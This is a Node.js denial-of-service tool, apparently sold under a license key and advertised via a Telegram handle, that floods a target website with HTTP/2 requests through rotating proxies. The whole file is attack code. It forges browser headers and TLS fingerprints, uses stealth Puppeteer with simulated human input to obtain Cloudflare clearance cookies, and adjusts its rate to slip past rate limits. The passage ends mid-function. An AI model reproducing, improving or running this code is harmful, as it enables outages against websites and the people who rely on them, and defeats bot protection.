#!/usr/bin/env node

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
require('events').EventEmitter.defaultMaxListeners = 0;

const fs       = require('fs');
const url      = require('url');
const cluster  = require('cluster');
const http2    = require('http2');
const http     = require('http');
const https    = require('https');
const colors   = require('colors');
const crypto   = require('crypto');
const axios    = require('axios');
const tls      = require("tls");
const puppeteer = require('puppeteer-extra'); 



let StealthPlugin = null; 
let puppeteerLib = null; 

try {
  puppeteerLib = require('puppeteer-extra');
  const StealthPlugin = require('puppeteer-extra-plugin-stealth');
  puppeteerLib.use(StealthPlugin());
} catch(e) {

  try {
    puppeteerLib = require('puppeteer');
    console.log("[i] puppeteer-extra 未安装，尝试使用纯 puppeteer。".yellow);
  } catch(err) {
    console.log("[!] 未安装 puppeteer 或 puppeteer-extra，无法启用 --puppeteer.".red);
    puppeteerLib = null;
  }
}



const target     = process.argv[2];
const duration   = parseInt(process.argv[3]);
const baseRps    = parseInt(process.argv[4]);
const threads    = parseInt(process.argv[5]);
const proxyfile  = process.argv[6];
const deviceType = process.argv[7] || 'desktop';
let currentRps = baseRps;
function get_option(flag) {
  const index = process.argv.indexOf(flag);
  return (index !== -1 && index + 1 < process.argv.length)
    ? process.argv[index + 1] 
    : undefined;
}
const kamiOption = get_option('--卡密');

if (!kamiOption) {
  console.log('[x] 必须提供 --卡密 <你的卡密> 才能使用！'.red);
  process.exit(1);
}

if (process.argv.length < 7) {
    console.clear();
    console.log(`
    usage:
        node cf-yujian.js [url] [time] [rate] [threads] [proxy]
        TG @yujiannnn 频道 [https://t.me/jishuyunye]

    options:
        --redirect      true/false   ~ Enable redirect system
        --ratelimit     true/false   ~ Enable ratelimit system
        --query         true/false   ~ Enable random queries
        --useragent     true/false   ~ Specify custom useragent
        --cookie        true/false   ~ Specify custom cookie
        --puppeteer     true/false   ~ Attempt to fetch cf_clearance via Puppeteer
    `);
    process.exit(0);
}

function verifyKami(kami) {

  const verifyUrl = 'https://dzpmanometry.cn/jb/verify_kami.php?kami=' + encodeURIComponent(kami);
  return axios.get(verifyUrl).then(resp => {
    if (resp.data.ok === true) {
      return true;  
    } else {
      throw new Error('卡密无效 TG@yujiannnn'.red);
    }
  });
}

function get_option(flag) {
  const index = process.argv.indexOf(flag);
  return (index !== -1 && index + 1 < process.argv.length)
    ? process.argv[index + 1] 
    : undefined;
}

const optionsList = [
  { flag: '--redirect',  value: get_option('--redirect') },
  { flag: '--ratelimit', value: get_option('--ratelimit') },
  { flag: '--query',     value: get_option('--query') },
  { flag: '--useragent', value: get_option('--useragent') },
  { flag: '--cookie',    value: get_option('--cookie') },
  { flag: '--referer',   value: get_option('--referer') },
  { flag: '--headers',   value: get_option('--headers') },
  { flag: '--content',   value: get_option('--content') },
  { flag: '--tcp',       value: get_option('--tcp') },
  { flag: '--puppeteer', value: get_option('--puppeteer') },
];

function enabled(key) {
  const flag = `--${key}`;
  const opt  = optionsList.find(o => o.flag === flag);
  if (!opt) return false;
  const val = opt.value;
  if (val === 'true')  return true;
  if (val === 'false') return false;
  if (!isNaN(val))     return parseInt(val);
  if (typeof val === 'string') return val;
  return false;
}
function testProxy(proxy, timeout = 5000) {
  return new Promise((resolve) => {
    const [scheme, host, port] = parseProxyStr(proxy);
    if (!host || !port) {
      return resolve(false);
    }


    const testUrl = "https://www.baidu.com"; 
    const parsedTestUrl = url.parse(testUrl);

    const agent = new http.Agent({
      keepAlive: true,
      maxFreeSockets: Infinity,
      keepAliveMsecs: Infinity,
      maxSockets: Infinity,
      maxTotalSockets: Infinity
    });

    const req = http.request({
      host,
      port,
      agent: agent,
      method: 'CONNECT',
      path: parsedTestUrl.host
    });


    const timer = setTimeout(() => {
      req.destroy();
      return resolve(false);
    }, timeout);

    req.on("connect", (res, socket) => {
      clearTimeout(timer);
      if (res.statusCode === 200) {

        return resolve(true);
      } else {
        return resolve(false);
      }
    });
    req.on("error", () => {
      clearTimeout(timer);
      return resolve(false);
    });

    req.end();
  });
}


function myDelay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

let proxies = [];

function isValidProxyFormat(proxy) {
  const proxyRegex = /^(?:(https?|socks5):\/\/)?([\w.-]+):(\d{1,5})$/;
  const match = proxy.match(proxyRegex);
  if (!match) return false;
  const port = parseInt(match[3], 10);
  return port >= 0 && port <= 65535;
}

function loadProxies(proxyfile) {
  let loaded = [];

  if (proxyfile.includes(':') && !fs.existsSync(proxyfile)) {
    if (isValidProxyFormat(proxyfile)) {
      loaded.push(proxyfile);
    }
  } else {
    const fileContent = fs.readFileSync(proxyfile, 'utf-8');
    loaded = fileContent
      .replace(/\r/g, '')
      .split('\n')
      .filter(Boolean)
      .filter(isValidProxyFormat);
  }
  return loaded;
}

try {
  proxies = loadProxies(proxyfile);
  if (!proxies.length) {
    console.error('No valid proxies found. Exiting.'.bold.red);
    process.exit(1);
  }
} catch (err) {
  console.error('Failed to load proxy file:', err.message);
  process.exit(1);
}

function markProxyAsBad(proxy, reason, infoData = {}) {

  console.log(colors.cyan('┌────────────────────────────────────────────────────────────────┐'));
  console.log(`[Master] Proxy fail: ${proxy}`.yellow + ` => ${reason}`.red);

  if (infoData.targetUrl) {
    console.log(`Target     : `.blue + `${infoData.targetUrl}`.magenta);
  }

  if (typeof infoData.statusCode !== 'undefined') {
    console.log(`StatusCode : `.blue + `${infoData.statusCode}`.cyan);
  }

  if (infoData.userAgent) {
    console.log(`User-Agent : `.blue + `${infoData.userAgent}`.grey);
  }

  if (infoData.acceptLang) {
    console.log(`Accept-Lang: `.blue + `${infoData.acceptLang}`.grey);
  }

  if (infoData.cookieStr) {
    console.log(`Cookie     : `.blue + `${infoData.cookieStr}`.white);
  }
  console.log(colors.cyan('└────────────────────────────────────────────────────────────────┘'));
  console.log();

  const idx = proxies.indexOf(proxy);
  if (idx !== -1) {
    proxies.splice(idx, 1);
  }
}



function getTargetUrl(_target) {
  if (_target.includes('.txt')) {
    const urls = fs.readFileSync(_target, 'utf-8').trim().split(/\r?\n/);
    return urls[Math.floor(Math.random() * urls.length)];
  } else if (_target.startsWith('http') || _target.startsWith('ws')) {
    return _target;
  } else {
    throw new Error("Invalid target, specify a URL or a .txt list of URLs");
  }
}

function random_item(list) {
  return list[Math.floor(Math.random() * list.length)];
}

function getCurrentTime() {
  const now = new Date();
  return `[${now.toTimeString().slice(0, 8)}]`;
}


const agentGlobal = new https.Agent({ rejectUnauthorized: false });
function getStatus() {
  const timeoutPromise = new Promise((_, reject) => {
    setTimeout(() => reject(new Error('Connection timeout')), 5000);
  });
  const axiosPromise = axios.get(process.argv[2], { httpsAgent: agentGlobal });
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      const { data } = response;
      console.log(`${getCurrentTime()} Title: ${getTitleFromHTML(data)}`);
    })
    .catch((error) => {
      if (error.message === 'Connection timeout') {
        console.log(`${getCurrentTime()} Connection timeout.`.bold.red);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`${getCurrentTime()} Title: ${extractedTitle} ${error.response.status}`.bold.green);
      } else {
        console.log(`${getCurrentTime()} ${error.message}`.bold.yellow);
      }
    });
}
function getTitleFromHTML(html) {
  try {
    if (typeof html !== 'string') {
      throw new TypeError('HTML is not a string.');
    }
    const match = html.match(/<title>(.*?)<\/title>/i);
    return match && match[1] ? match[1].trim() : 'Not Found';
  } catch (error) {
    return 'Error: Unable to extract title';
  }
}


const ja4 = (deviceType, version /* 1 || 2 || 3 || 4 || 6 */ ) => {

    const ciper_a = [1, 2, 5, 9];
    const cipher_b = [4, 6, 8];
    const cipher_c = [3, 7];


    const desktop_cipher = [10, 11, 13, 15, 22, 25, 27, 29, 35, 39, 45, 49, 55, 65, 72, 75, 82, 85, 92, 95, 99];

    const mobile_cipher = [13, 17, 23, 27, 33, 37, 43, 47, 53, 57, 63, 67, 73, 77, 83, 87, 93, 97];

    const tablet_cipher = [12, 16, 21, 26, 32, 36, 42, 46, 52, 56, 62, 66, 72, 76, 82, 86, 92, 96];

    function getRandomCipher(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }

    if (deviceType === 'desktop') {
        if (version === 1) {

            return getRandomCipher(ciper_a);
        } else if (version === 2) {

            return getRandomCipher(desktop_cipher);
        } else if (version === 3) {

            return `${getRandomCipher(ciper_a)}${getRandomCipher(desktop_cipher)}`;
        } else if (version === 4) {

            if (Math.random() < 0.5) {
                return `${getRandomCipher(ciper_a)}${getRandomCipher(ciper_a)}${getRandomCipher(desktop_cipher)}`;
            } else {
                return `${getRandomCipher(desktop_cipher)}${getRandomCipher(desktop_cipher)}`;
            }
        } else if (version === 6) {

            if (Math.random() < 0.5) {
                return `${getRandomCipher(ciper_a)}${getRandomCipher(ciper_a)}${getRandomCipher(ciper_a)}${getRandomCipher(ciper_a)}${getRandomCipher(desktop_cipher)}`;
            } else {
                return `${getRandomCipher(ciper_a)}${getRandomCipher(desktop_cipher)}${getRandomCipher(ciper_a)}${getRandomCipher(desktop_cipher)}`;
            }
        }
    }


    if (deviceType === 'mobile') {
        if (version === 1) {
            return getRandomCipher(cipher_b);
        } else if (version === 2) {
            return getRandomCipher(mobile_cipher);
        } else if (version === 3) {
            return `${getRandomCipher(cipher_b)}${getRandomCipher(mobile_cipher)}`;
        } else if (version === 4) {
            if (Math.random() < 0.5) {
                return `${getRandomCipher(cipher_b)}${getRandomCipher(cipher_b)}${getRandomCipher(mobile_cipher)}`;
            } else {
                return `${getRandomCipher(mobile_cipher)}${getRandomCipher(mobile_cipher)}`;
            }
        } else if (version === 6) {
            if (Math.random() < 0.5) {
                return `${getRandomCipher(cipher_b)}${getRandomCipher(cipher_b)}${getRandomCipher(mobile_cipher)}${getRandomCipher(mobile_cipher)}`;
            } else {
                return `${getRandomCipher(cipher_b)}${getRandomCipher(mobile_cipher)}${getRandomCipher(mobile_cipher)}${getRandomCipher(cipher_b)}`;
            }
        }
    }

    if (deviceType === 'tablet') {
        if (version === 1) {
            return getRandomCipher(cipher_c);
        } else if (version === 2) {
            return getRandomCipher(tablet_cipher);
        } else if (version === 3) {
            return `${getRandomCipher(cipher_c)}${getRandomCipher(tablet_cipher)}`;
        } else if (version === 4) {
            if (Math.random() < 0.5) {
                return `${getRandomCipher(cipher_c)}${getRandomCipher(cipher_c)}${getRandomCipher(tablet_cipher)}`;
            } else {
                return `${getRandomCipher(tablet_cipher)}${getRandomCipher(tablet_cipher)}`;
            }
        } else if (version === 6) {
            if (Math.random() < 0.5) {
                return `${getRandomCipher(cipher_c)}${getRandomCipher(cipher_c)}${getRandomCipher(tablet_cipher)}${getRandomCipher(tablet_cipher)}`;
            } else {
                return `${getRandomCipher(tablet_cipher)}${getRandomCipher(cipher_c)}${getRandomCipher(tablet_cipher)}${getRandomCipher(cipher_c)}`;
            }
        }
    }


    return 0;
};


function _headers() {


    const accept_list = [
        "text/html,application/xhtml+xml,application/xml;q=0.${ja4(deviceType,1)},image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "application/json",
        "*/*"
    ];


    const accept_encoding_list = [
        "gzip, deflate, br",
        "gzip, deflate, br, zstd"
    ];

    const accept_language_list = [
        `en-US,en;q=0.${ja4(deviceType,1)}`,
        `en-GB,en;q=0.${ja4(deviceType,1)}`,
        `en;q=0.8`,
        `fr-FR,fr;q=0.${ja4(deviceType,1)},en;q=0.8`,
        `es-ES,es;q=0.${ja4(deviceType,1)},en;q=0.8`,
        `de-DE,de;q=0.${ja4(deviceType,1)},en;q=0.8`,
        `it-IT,it;q=0.${ja4(deviceType,1)},en;q=0.8`,
        `pt-BR,pt;q=0.${ja4(deviceType,1)},en;q=0.8`,
        `zh-CN,zh;q=0.${ja4(deviceType,1)},en;q=0.8`,
        `ja-JP,ja;q=0.${ja4(deviceType,1)},en;q=0.8`
    ];


    const sec_ch_ua_platform_list = [
        { platform: 'Windows', userAgentDetail: 'Windows NT 10.0; Win64; x64', isMobile: "?0" },
        { platform: 'Windows', userAgentDetail: 'Windows NT 6.1; WOW64',       isMobile: "?0" },
        { platform: 'Linux',   userAgentDetail: 'X11; Linux x86_64',           isMobile: "?0" },
        { platform: 'Linux',   userAgentDetail: 'X11; Linux i686',             isMobile: "?0" },
        { platform: 'macOS',   userAgentDetail: 'Macintosh; Intel Mac OS X 10_15_7', isMobile: "?0" },
        { platform: 'macOS',   userAgentDetail: 'Macintosh; Intel Mac OS X 11_0',    isMobile: "?0" }
    ];


    const sec_fetch_dest_list = ["document","embed","empty","font","frame","iframe","image","manifest","object","report","script","serviceworker","worker"];
    const sec_fetch_mode_list = ["cors","navigate","no-cors","websocket"];
    const sec_fetch_site_list = ["cross-site","same-origin","same-site","none"];


    const chrome_versions = `1${ja4(deviceType,2)}.0.${ja4(deviceType,4)}.${ja4(deviceType,3)}`;


    const selected_platform = random_item(sec_ch_ua_platform_list);

    const majorVersion = chrome_versions.split('.')[0];


    let headers = {
        "accept":             random_item(accept_list),
        "accept-encoding":    random_item(accept_encoding_list),
        "accept-language":    random_item(accept_language_list),


        ...(Math.random() < 0.5 && { "dnt": "0" }),
        ...(Math.random() < 0.5 && { "priority": "u=0, i" }),

        "sec-ch-ua": `"Google Chrome";v="${majorVersion}", "Not=A?Brand";v="${ja4(deviceType,1)}", "Chromium";v="${majorVersion}"`,
        "sec-ch-ua-arch": "x86",
        "sec-ch-ua-bitness": `${ja4(deviceType, 2)}`,
        "sec-ch-ua-full-version": chrome_versions,
        "sec-ch-ua-full-version-list": `"Google Chrome";v="${chrome_versions}", "Not=A?Brand";v="${ja4(deviceType,1)}.0.0.0", "Chromium";v="${chrome_versions}"`,
        "sec-ch-ua-mobile":   selected_platform.isMobile,
        "sec-ch-ua-model":    "PC",
        "sec-ch-ua-platform": selected_platform.platform,
        "sec-ch-ua-platform-version": "10.0.0",  

        "sec-fetch-dest": random_item(sec_fetch_dest_list),
        "sec-fetch-mode": random_item(sec_fetch_mode_list),
        "sec-fetch-site": random_item(sec_fetch_site_list),
        "sec-fetch-user": Math.random() < 0.9 ? "?1" : "?0",
        "content-type":   "application/x-www-form-urlencoded",


        "device-memory": random_item(["0.1518", "0.6", "1", "4", "6", "8"]),


        ...(Math.random() < 0.1 && { "early-data": "0" }),


        "user-agent": `Mozilla/5.0 (${selected_platform.userAgentDetail}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chrome_versions} Safari/537.36`,


        ...(Math.random() < 0.7 && { "upgrade-insecure-requests": "0" }),
    };

    return headers;
}


function processHeaders(headers) {

  const generateRandomNumber = (length) => {
    const min = Math.pow(10, length - 1);
    const max = Math.pow(10, length) - 1;
    return Math.floor(Math.random() * (max - min + 1)) + min;
  };


  const getCurrentTimestamp = () => Date.now();


  for (const key in headers) {
    if (Object.prototype.hasOwnProperty.call(headers, key)) {
      let value = headers[key];

      value = value
        .replace(/%RAND%/g, () => `{${generateRandomNumber(10)}}`) 
        .replace(/%RANDCNPHONE%/g, () => `{${generateRandomNumber(11)}}`) 
        .replace(/%RANDUSPHONE%/g, () => `{${generateRandomNumber(10)}}`)
        .replace(/%TIMESTAMP%/g, () => `{${getCurrentTimestamp()}}`) 
        .replace(/%RANDA%/g, () => `${ja4(deviceType,1)}`)
        .replace(/%RANDB%/g, () => `${ja4(deviceType,2)}`)
        .replace(/%RANDC%/g, () => `${ja4(deviceType,3)}`)
        .replace(/%RANDD%/g, () => `${ja4(deviceType,4)}`)
        .replace(/%RANDE%/g, () => `${ja4(deviceType,5)}`)
        .replace(/%RANDF%/g, () => `${ja4(deviceType,6)}`)

      headers[key] = value;
    }
  }
  return headers;
}


const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
  defaultCiphers[2],
  defaultCiphers[1],
  defaultCiphers[0],
  defaultCiphers.slice(3)
].join(":");

function ja3(socket) {
  try {
    const cipherInformation = socket.getCipher();
    const protocolVersion   = socket.getProtocol();
    if (!cipherInformation) return null;
    const ja3String = `${protocolVersion},${cipherInformation.name},${cipherInformation.version},${cipherInformation.bits}`;
    return crypto.createHash('md5').update(ja3String).digest('hex');
  } catch (err) {
    return null;
  }
}

function _tlsSocket(parsed, socket) {
  const tls_socket = tls.connect({
    host: parsed.host,
    ciphers: "GREASE:"+ciphers,
    servername: parsed.host,
    secure: true,
    rejectUnauthorized: false,
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    ALPNProtocols: ['h2','http/1.1'],
    socket: socket,
    requestOCSP: true
  });
  tls_socket.setKeepAlive(true, 30000 * 1000);
  return tls_socket;
}


let ratelimit = [];

async function sunflare(cfClearanceCookie = '') {
  const currentTime = Date.now();
  const target_url  = getTargetUrl(target);


  ratelimit = ratelimit.filter(limit => currentTime - limit.timestamp <= 60000);

  let proxyArr;
  do {
    proxyArr = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    if (!proxyArr) return;
  } while (ratelimit.some(limit => limit.proxy === proxyArr[0] && (Date.now() - limit.timestamp) < 60000));

  const [proxyHost, proxyPort] = proxyArr;
  const parsed = url.parse(target_url);

  const agent = new http.Agent({
    keepAlive: true,
    maxFreeSockets: Infinity,
    keepAliveMsecs: Infinity,
    maxSockets: Infinity,
    maxTotalSockets: Infinity
  });

  http.request({
    host: proxyHost,
    port: proxyPort,
    agent: agent,
    globalAgent: agent,
    headers: {
      'Host': parsed.host,
      'Proxy-Connection': 'Keep-Alive',
      'Connection': 'Keep-Alive',
    },
    method: 'CONNECT',
    path: parsed.host,
  }).on("connect", async (res, socket) => {
    if (res.statusCode === 200) {
      let myRandHeaders = _headers();
      if (cfClearanceCookie) {

        myRandHeaders["cookie"] = `cf_clearance=${cfClearanceCookie}`;
      }
      let headers = {
        ":authority": parsed.host,
        ":method": "GET",
        ":path": parsed.pathname || '/',
        ":scheme": "https",
        ...myRandHeaders
      };
      headers = processHeaders(headers);

      socket.setKeepAlive(true, 100000);
      const tls_socket = _tlsSocket(parsed, socket);

      tls_socket.on('secureConnect', () => {
        const fp = ja3(tls_socket) || 'none';
        headers["x-trace-id"] = fp;
      });
      tls_socket.on('error', () => {});

      const client = http2.connect(parsed.href, {
        createConnection: () => tls_socket,
        initialWindowSize: 15663105,
        settings: {
          headerTableSize: 65536,
          maxConcurrentStreams: 1000,
          initialWindowSize: 6291456,
          maxHeaderListSize: 262144,
          enablePush: false,
        },
      }, () => {
        function requestLoop() {
          if (client.destroyed || client.closed) return;
          const req = client.request(headers);
          req.on("response", (res) => {
            const status = res[':status'];
            if (status === 429 && enabled('ratelimit')) {
              ratelimit.push({proxy: proxyArr, timestamp: Date.now()});
              client.close();
              return;
            }
            if (res["set-cookie"]) {

              headers["cookie"] = res["set-cookie"].join('; ');
            }
            req.close();
          });
          req.on("error", () => {});
          req.end();
          const delay = getRandomDelay(currentRps);
          setTimeout(requestLoop, delay);

        }
        requestLoop();
      });

      client.on('error', (err) => {
        if (err.code === "ERR_HTTP2_GOAWAY_SESSION") {
          client.close();
        } else {
          client.destroy();
        }
      });
    }
  }).on("error", () => {}).end();
}

async function simulateHumanActions(page) {

  await myDelay(1000 + Math.floor(Math.random() * 4000));


  const x = 100 + Math.floor(Math.random() * 200);
  const y = 100 + Math.floor(Math.random() * 200);
  await page.mouse.move(x, y, { steps: 10 });


  if (Math.random() < 0.3) {
    await page.mouse.click(x + 5, y + 5);
  }


  if (Math.random() < 0.5) {
    const scrollY = 200 + Math.floor(Math.random() * 300);
    await page.evaluate((scrollY) => window.scrollBy(0, scrollY), scrollY);
  }


  await myDelay(1000 + Math.floor(Math.random() * 3000));

  if (Math.random() < 0.2) {
    await page.keyboard.type('Hello Cloudflare ');
    await page.keyboard.press('Enter');
  }
}

async function fetchCloudflareCookie(targetUrl, proxy) {

  if (!puppeteer) {
    console.log(`[!] Puppeteer not available, skip fetch`.red);
    return [];
  }

  const pid = process.pid;
  console.log(`[Worker ${pid}] Launching Puppeteer for CF clearance...`.cyan);

  let launchArgs = [ '--no-sandbox', '--disable-setuid-sandbox' ];
  if (proxy) {
    launchArgs.push(`--proxy-server=${proxy}`);
  }

  let cookies = [];
  let browser = null;

  try {

    browser = await puppeteer.launch({
      headless: 'new', 
      ignoreHTTPSErrors: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--ignore-certificate-errors'
      ]
    });
    const page = await browser.newPage();

    await page.setViewport({ width: 1920, height: 1080 });

    const response = await page.goto(targetUrl, {
      waitUntil: 'networkidle2',
      timeout: 60000
    });

    if (!response) {
      console.log(`[Worker ${pid}] Response is null (likely proxy fail).`.yellow);
      await browser.close();
      return [];
    }

    const statusCode = response.status();
    const pageTitle  = await page.title();

    await simulateHumanActions(page);


    await myDelay(3000 + Math.floor(Math.random() * 2000));


    cookies = await page.cookies();

    const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');


    const myHeaders = _headers(); 

    console.log(colors.cyan('┌────────────────────────────────────────────────────────────────┐'));
    console.log(`[Worker ${pid}] `.blue + `Got cookies, count=${cookies.length}`.green);
    console.log(`Proxy      : `.blue + `${proxy || 'N/A'}`.yellow);
    console.log(`Title      : `.blue + `${pageTitle}`.magenta);
    console.log(`StatusCode : `.blue + `${statusCode}`.cyan);
    console.log(`User-Agent : `.blue + (myHeaders["user-agent"] || 'N/A').grey);
    console.log(`Accept-Lang: `.blue + (myHeaders["accept-language"] || 'N/A').grey);
    console.log(`Cookie     : `.blue + cookieStr.white);
    console.log(colors.cyan('└────────────────────────────────────────────────────────────────┘'));
    console.log();

  } catch (err) {
    console.log(`[Worker ${pid}] Puppeteer error: ${err.message}`.red);
  } finally {
    if (browser) {
      await browser.close().catch(()=>{});
    }
  }

  return cookies;
}



function parseProxyStr(proxyStr) {

  let match = proxyStr.match(/^(?:(https?|socks5):\/\/)?([^:]+):(\d{1,5})$/i);
  if (!match) return [ null, null, null ];
  const scheme = match[1] || 'http';
  const host   = match[2];
  const port   = match[3];
  return [scheme, host, port];
}

function createHttp2Client(parsed, tls_socket) {
  return http2.connect(parsed.href, {
    createConnection: () => tls_socket,
    initialWindowSize: 15663105,
    settings: {
      headerTableSize: 65536,
      maxConcurrentStreams: 1000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      enablePush: false,
    }
  });
}


function getRandomDelay(rps) {

  const interval = 1000 / rps; 
  const jitter   = interval * 0.3;
  return Math.floor(interval + (Math.random() - 0.5) * 2 * jitter);
}

function workerAttackLoop(client, proxy, allCookies, headers, path) {
  if (client.destroyed || client.closed) return;

  const cookieStr = allCookies.map(c => `${c.name}=${c.value}`).join('; ');
  headers["cookie"] = cookieStr;

  const req = client.request(headers);
  req.on("response", (resHeaders) => {
    const status = resHeaders[':status'];
if (status === 429 && enabled('ratelimit')) {
  process.send({ cmd: 'reduceRps' });
  
  markProxyAsBad(proxy, `HTTP 429 ratelimit => path=${path}`);
  client.close();
  return;
}


    if (resHeaders["set-cookie"]) {
      const newCookies = resHeaders["set-cookie"].map(parseSetCookieString);

      allCookies = mergeCookies(allCookies, newCookies);
    }
    req.close();
  });
  req.on("error", () => {
  	markProxyAsBad(proxy, `Request error => ${err.message}, path=${path}`);
  });
  req.end();


  setTimeout(() => workerAttackLoop(client, proxy, allCookies, headers, path), getRandomDelay(baseRps));
}

function parseSetCookieString(setCookieValue) {
  const parts = setCookieValue.split(';')[0].split('=');
  const name  = parts[0];
  const value = parts.slice(1).join('=');
  return { name, value };
}


function mergeCookies(oldCookies, newCookies) {
  const map = {};
  oldCookies.forEach(c => map[c.name] = c.value);
  newCookies.forEach(c => map[c.name] = c.value);

  return Object.entries(map).map(([name, value]) => ({ name, value }));
}

const restartInterval = 60000;

function startMain() {
if (cluster.isMaster) {
  // Master
  console.clear();
  console.log(`[- `.red, 'C F Y U J I A N'.bold, ' -]'.red);
  console.log(`[-`.red, `Target : ${target}`.bold, ' -]'.red);
  console.log(`[-`.red, `Time   : ${duration}`.bold, ' -]'.red);
  console.log(`[-`.red, `Threads: ${threads}`.bold, ' -]'.red);
  console.log(`[-`.red, `RPS    : ${baseRps}`.bold, ' -]'.red);
  console.log(`[-`.red, `Proxies: ${proxyfile}`.bold, ' -]'.red);
    (async () => {
      try {
        await verifyKami(kamiOption);
        console.log('[√] 卡密验证通过'.green);
      } catch(e) {
        console.log('[x] ' + e.message);
        process.exit(1);
      }
    })();
  let remainingDuration = duration * 1000;


  console.log(`[Master] Testing all proxies for availability...`.cyan);

  const testPromises = proxies.map(proxy => testProxy(proxy, 10000)
    .then(isAlive => ({ proxy, isAlive })));

  Promise.all(testPromises).then(results => {
    const aliveList = results.filter(r => r.isAlive).map(r => r.proxy);

    console.log(`[Master] Proxies total = ${proxies.length}, alive = ${aliveList.length}`.green);
    proxies = aliveList;

    if (proxies.length === 0) {
      console.error(`[Master] No proxies alive, stopping...`.red);
      process.exit(1);
    }


    startWorkers();
  }).catch(err => {
    console.error(`[Master] Error in proxy test: ${err.message}`.red);
    process.exit(1);
  });
  } else {

  process.on('message', (msg) => {
    if (msg === 'shutdown') {
      console.log(`Worker ${process.pid} shutting down gracefully...`.bold.green);
      process.exit(0);
    }
  });

  (async () => {
    const proxy = process.env.WORKER_PROXY || null;
    console.log(`[Worker ${process.pid}] Using proxy: ${proxy}`.gray);

    let allCookies = [];
    if (enabled('puppeteer')) {
      allCookies = await fetchCloudflareCookie(target, proxy);
    }

    const mainAttack = setInterval(() => {
      if (!proxies.length) {
        console.log(`[Worker ${process.pid}] No more proxies left. Stopping...`.bold.red);
        clearInterval(mainAttack);
        process.exit(0);
        return;
      }
      if (!proxy) {
        console.log(`[Worker ${process.pid}] No assigned proxy. Stopping...`.bold.red);
        clearInterval(mainAttack);
        process.exit(0);
        return;
      }
      doAttackCycle(allCookies, proxy);
    }, 500);


    setTimeout(() => {
      clearInterval(mainAttack);
      console.log(`Worker ${process.pid} stopping (normal).`.bold.magenta);
      process.exit(0);
    }, duration * 1000);

  })().catch(e => {
    console.error(`[Worker ${process.pid}] Error: ${e.message}`.red);
    process.exit(1);
  });
}
}
function startWorkers() {
    let assignedProxies = [];
    for (let i = 0; i < threads; i++) {
      const proxy = proxies[i % proxies.length];
      assignedProxies.push(proxy);
    }

    setInterval(getStatus, 5000);


    assignedProxies.forEach((p) => {
      const worker = cluster.fork({ WORKER_PROXY: p || '' });
      worker.on('exit', (code, signal) => {
        console.log(`Worker ${worker.process.pid} exited. code=${code} signal=${signal}`.yellow);
      });
    });

for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg && msg.cmd === 'reduceRps') {
    currentRps = Math.max(1, Math.floor(currentRps * 0.8));
    console.log(colors.cyan('┌────────────────────────────────────────────────────────────────┐'));
    console.log(`[Master] `.blue + `检测到429速率限制，自动降低RPS`.green);
    console.log(`RPS      : `.blue + `reduce RPS => ${currentRps}`.yellow);
    console.log(colors.cyan('└────────────────────────────────────────────────────────────────┘'));
    console.log();
        // 广播新的RPS给所有Worker
        for (const wid in cluster.workers) {
          cluster.workers[wid].send({
            cmd: 'updateRps',
            newRps: currentRps
          });
        }
      }
    });
  }
  const restartWorkers = setInterval(() => {
    if (remainingDuration > restartInterval) {
      console.log(`[Master] Restarting workers....bold`.cyan);
      for (const id in cluster.workers) {
        cluster.workers[id].kill();
      }
  
      assignedProxies = [];
      for (let i = 0; i < threads; i++) {
        if (!proxies.length) break;
        assignedProxies.push(proxies[Math.floor(Math.random() * proxies.length)]);
      }
      assignedProxies.forEach((p) => cluster.fork({ WORKER_PROXY: p || '' }));

      remainingDuration -= restartInterval;
    } else {
      clearInterval(restartWorkers);
    }
  }, restartInterval);

  setTimeout(() => {
    console.log(`[- Completed. Application stopping... -]`.bold.cyan);
    gracefulShutdown();
    clearInterval(restartWorkers);
  }, duration * 1000);

  process.on('SIGTERM', gracefulShutdown);
  process.on('SIGINT', gracefulShutdown);
}
  function gracefulShutdown() {
    for (const id in cluster.workers) {
      cluster.workers[id].send('shutdown');
    }
    setTimeout(() => {
      for (const id in cluster.workers) {
        cluster.workers[id].kill();
      }
      process.exit(0);
    }, 5000);
  }


function doAttackCycle(allCookies, proxy) {
  const targetUrl = getTargetUrl(target);
  const parsed = url.parse(targetUrl);
  const [scheme, host, port] = parseProxyStr(proxy);
  if (!host || !port) {
      const infoData = {
        targetUrl,
        statusCode: '???', 
        userAgent:  '(N/A)',
        acceptLang: '(N/A)',
        cookieStr:  '(N/A)'
      };
      
      markProxyAsBad(proxy, 'Invalid host/port', infoData);
      return;
  }

  const agent = new http.Agent({
    keepAlive: true,
    maxFreeSockets: Infinity,
    keepAliveMsecs: Infinity,
    maxSockets: Infinity,
    maxTotalSockets: Infinity
  });

  const req = http.request({
    host,
    port,
    agent: agent,
    globalAgent: agent,
    method: 'CONNECT',
    path: parsed.host
  });
  req.on("connect", (_res, socket) => {
    if (_res.statusCode === 200) {
      socket.setKeepAlive(true, 100000);
      const tls_socket = _tlsSocket(parsed, socket);
      tls_socket.on('error', () => {});
      const client = createHttp2Client(parsed, tls_socket);
      client.on('error', (err) => {
        console.error(proxy,`HTTP2 error => ${err.code || err.message}`.red);
        client.destroy();
      });

      let baseHeaders = {
        ":method": "GET",
        ":authority": parsed.host,
        ":path": parsed.pathname || '/',
        ":scheme": "https",
        "user-agent": `Mozilla/5.0 (Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${99+ja4(deviceType,2)}.0.${ja4(deviceType,4)}.${ja4(deviceType,3)} Safari/537.36`
      };
      workerAttackLoop(client, proxy, allCookies, baseHeaders, parsed.pathname || '/');
    } else {
        const infoData = {
        targetUrl,
        statusCode: _res.statusCode, 
        userAgent: '(N/A)', 
        acceptLang: '(N/A)',
        cookieStr: '(N/A)'
      };
